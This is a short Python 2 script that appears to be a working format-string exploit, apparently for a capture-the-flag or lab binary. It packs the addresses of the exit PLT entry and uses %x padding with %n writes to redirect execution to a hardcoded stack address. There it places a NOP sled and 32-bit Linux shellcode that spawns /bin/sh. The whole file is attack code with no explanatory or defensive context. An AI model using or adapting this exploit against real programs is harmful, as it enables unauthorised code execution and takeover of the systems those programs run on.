import struct

SHELLCODE = b"\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x6A\x0B\x58\x89\xE3\x31\xC9\x31\xD2\xCD\x80"

EXIT_PLT = 0x80497e0
SHELLCODE_ADDR = 0xffffd6e4

least_addr = struct.pack('I', EXIT_PLT)
most_addr = struct.pack('I', EXIT_PLT + 2)

exploit = ""
exploit += least_addr
exploit += most_addr

exploit += b"%10$55004x"
exploit += b"%10$n "
exploit += b"%10$76058x"
exploit += b"%11$n "

exploit += '\x00'

exploit += b'\x90'*(99 - len(exploit)-len(SHELLCODE))

exploit += SHELLCODE

print exploit
